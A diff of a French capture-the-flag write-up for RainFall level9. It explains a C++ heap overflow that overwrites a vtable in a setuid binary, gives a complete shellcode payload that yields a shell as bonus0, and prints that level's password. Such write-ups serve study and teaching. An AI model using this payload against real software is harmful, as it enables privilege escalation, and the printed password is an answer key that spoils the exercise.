@@ -1,110 +1,165 @@
-``` bash
+# LEVEL9
+
+Le système de fichier se présente de cette manière :
+
+```bash
+level9@RainFall:~$ ls -la
+
 dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
 dr-x--x--x  1 root   root    340 Sep 23  2015 ..
 -rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
 -rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
 -rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
 -rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
--rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
-
+-rw-r--r-- 1 level9 level9  675 Apr  3  2012 .profile
 ```
 
-``` bash
-(gdb) disas main
-Dump of assembler code for function main:
-   0x080485f4 <+0>:	push   ebp
-   0x080485f5 <+1>:	mov    ebp,esp
-   0x080485f7 <+3>:	push   ebx
-   0x080485f8 <+4>:	and    esp,0xfffffff0
-   0x080485fb <+7>:	sub    esp,0x20
-   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
-   0x08048602 <+14>:	jg     0x8048610 <main+28>
-   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
-   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
-   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c     #
-   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>    # allocation new(0x6c) -> 0x804a008
-   0x0804861c <+40>:	mov    ebx,eax
-   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5  # 2eme arg constructeur
-   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx      # 1er arg -> pointeur sur adress
-   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>    # appel constructeur N::N(this, 5)
-   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx # this?
-   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
-   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>    # new(0x6c) -> 0x804a078
-   0x0804863e <+74>:	mov    ebx,eax
-   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
-   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
-   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>    # constructeur N::N(this_00, 6)
-   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx # adresse instance allouee this_00
-   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c] # adresse instance allouee this
-   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax # adresse instance allouee this (dans esp)
-   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18] # adresse instance allouee this_00 (dans eax)
-   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax # adresse instance allouee this_00 (dans esp)
-   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]  # argv[1] ?
-   0x08048667 <+115>:	add    eax,0x4                  # 4 dans eax
-   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]      # ????????
-   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax  # argv[1] + 4 ?
-   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14] # this
-   0x08048674 <+128>:	mov    DWORD PTR [esp],eax      # 1er arg this
-   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> # setAnnotation(this, argv[1] + 4) ?
-   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10] # adresse instance allouee this_00
-   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]      # eax 0x804a078 ---> 0x08048848 (this00)
-   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]      # adresse instance allouee this_00
-   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14] # adresse instance allouee this
-   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax  # adresse instance allouee this
-   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
-   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
-   0x08048693 <+159>:	call   edx
-   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
-   0x08048698 <+164>:	leave  
-   0x08048699 <+165>:	ret    
-End of assembler dump.
+Le binaire `level9` possède le **SUID** et appartient à `bonus0`. Il s'exécute donc avec les privilèges de `bonus0`.
 
+## Analyse
+
+Le binaire est écrit en **C++** et utilise une classe `N`.
+
+Deux objets sont créés dans le `main` :
+
+```cpp
+N *a = new N(5);
+N *b = new N(6);
 ```
 
-``` bash
-(gdb) disas _ZN1N13setAnnotationEPc
-Dump of assembler code for function _ZN1N13setAnnotationEPc:
-   0x0804870e <+0>:	push   ebp
-   0x0804870f <+1>:	mov    ebp,esp
-   0x08048711 <+3>:	sub    esp,0x18
-   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
-   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
-   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]  # edx = 0x804a008: 0x08048848
-   0x08048722 <+20>:	add    edx,0x4                  # + 4 = 0x804a00c    
-   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax  # taille
-   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax  # source
-   0x08048730 <+34>:	mov    DWORD PTR [esp],edx      # dest
-   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
-   0x08048738 <+42>:	leave  
-   0x08048739 <+43>:	ret    
-End of assembler dump.
+Chaque objet fait `0x6c` octets :
 
+```asm
+mov DWORD PTR [esp],0x6c
+call _Znwj
 ```
 
-``` bash
+Les allocations donnent :
+
+```text
+a -> 0x0804a008
+b -> 0x0804a078
+```
+
+Le constructeur initialise la vtable et la valeur de l'objet :
+
+```asm
+mov [this], 0x08048848
+mov [this + 0x68], value
+```
+
+La structure de l'objet est donc approximativement :
+
+```text
++0x00  vtable
++0x04  annotation
+...
++0x68  value
+```
+
+### `setAnnotation()`
+
+Le programme appelle :
+
+```cpp
+a->setAnnotation(argv[1]);
+```
+
+La fonction fait :
+
+```asm
+strlen(argv[1])
+
+memcpy(this + 4, argv[1], strlen(argv[1]))
+```
+
+Il n'y a **aucune vérification de taille** avant le `memcpy`.
+
+L'annotation commence donc à :
+
+```text
+a + 0x04 = 0x0804a00c
+```
+
+et peut dépasser la taille de l'objet.
+
+Cela permet d'écraser des données situées après `a`, notamment la vtable de `b`.
+
+## Exploitation
+
+La taille d'un objet est de `0x6c`, soit 108 octets.
+
+Un test avec 109 caractères permet de provoquer un crash :
+
+```bash
 level9@RainFall:~$ ./level9 $(python2 -c 'print "A" * 109')
 Segmentation fault (core dumped)
 ```
-108
 
-shellcode = 34
+L'appel final du programme est particulièrement intéressant :
 
-"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 74 + "\x0c\xa0\x04\x08"
+```asm
+mov eax, [b]
+mov edx, [eax]
+...
+call edx
+```
 
-1er echec
-$(python2 -c 'import sys; sys.stdout.write("\x10\xa0\x04\x08" + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 70 + "\x0c\xa0\x04\x08")')
+Le programme récupère donc la **vtable de `b`**, prend sa première entrée et l'utilise comme adresse de fonction.
 
-Program received signal SIGSEGV, Segmentation fault.
+En débordant `a`, on peut remplacer cette vtable par une adresse contrôlée.
+
+On place alors :
+
+```text
+0x0804a010
+```
+
+dans la vtable, afin que l'appel indirect récupère une adresse située dans notre payload.
+
+Le reste du payload contient un shellcode précédé d'un NOP sled :
+
+```text
+shellcode : 34 octets
+NOP       : 70 octets
+adresse   : 0x0804a00c
+```
+
+Une première tentative avec :
+
+```text
+0x0804a010
+```
+
+comme adresse de vtable provoque :
+
+```text
 0x9958316a in ?? ()
+```
 
-REUSSITE = 
+Le retour n'arrive donc pas au bon endroit.
 
-``` bash
+L'adresse est ensuite ajustée afin que l'appel indirect tombe sur le shellcode présent dans l'objet.
+
+## Exploit
+
+```bash
 level9@RainFall:~$ ./level9 $(python2 -c 'import sys; sys.stdout.write("\x10\xa0\x04\x08" + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 70 + "\x0c\xa0\x04\x08")')
+```
+
+On obtient un shell avec les privilèges de `bonus0` :
+
+```bash
 $ id
+
 uid=2010(bonus0) gid=2009(level9) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
+```
+
+On peut ensuite récupérer le mot de passe :
+
+```bash
 $ cat /home/user/bonus0/.pass
+
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
+
